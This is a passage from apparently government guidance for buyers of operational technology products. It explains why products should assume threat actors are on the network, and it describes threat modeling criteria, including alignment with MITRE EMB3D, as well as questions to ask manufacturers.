product assumes a threat actor is operating on the network and protects itself  against malicious emergency, safety, or diagnostic commands. Components should assume threat actors are on the network. While these systems work  well in a trusted environment, they are obvious targets for threat actors seeking to rapidly degrade OT  systems. A threat actor can recreate those  conditions or send a command to weaponize safety features against the system. Products must mitigate  the risks from a threat actor compromising a trusted device or intentionally violating a standard to do  harm. Threat Modeling  Selection criteria: The product has a full and detailed threat model. What security measures does the product implement to reduce these threat scenarios? Does the manufacturer have a roadmap to address gaps in their threat model? Why this matters: Threat models are necessary for asset owners to understand the risk from a product and  prioritize their security controls. Threat modeling is a structured process designed to identify and  analyze risks. Transparent threat models and corresponding mitigations allow buyers to understand the  risk from disabling product mitigations and determine if a product is maintaining pace with modern threat  actors. Buyers should seek out threat models that track and incorporate threat sources, such as MITRE EMB3D,  so that threats are aligned with modern threat actor capabilities. Public threat sources allow manufacturers  to communicate threats and mitigations using a shared language, making it simpler for buyers to  understand how a product fits into their overall security model. Buyers should avoid products that rely entirely on a threat  actor never accessing the OT network. Buyers should search for manufacturers that use threat modeling throughout the software development  lifecycle to understand where and how security measures should be prioritized and implemented to protect  their product from malicious actors. Manufacturers that document and update threat models, hardening  guidance and secure lifecycle development, are more likely to build products that will be resilient against  both known and emerging threats. Asset owners and operators should partner with a manufacturer’s threat  modelling capability to prioritize upgrades and patches that impact their OT system. Additionally, threat  models enable manufacturers and buyers to answer the following questions:    What security products (e.g., EDR, network monitoring, firewalls) or security controls and policies  (segmentation, password policies) does the manufacturer assume are protecting the product? Why this matters: Patches are an excellent way to protect against known threats. Department of Energy, CESER, Energy Threat Analysis Center; U.S."
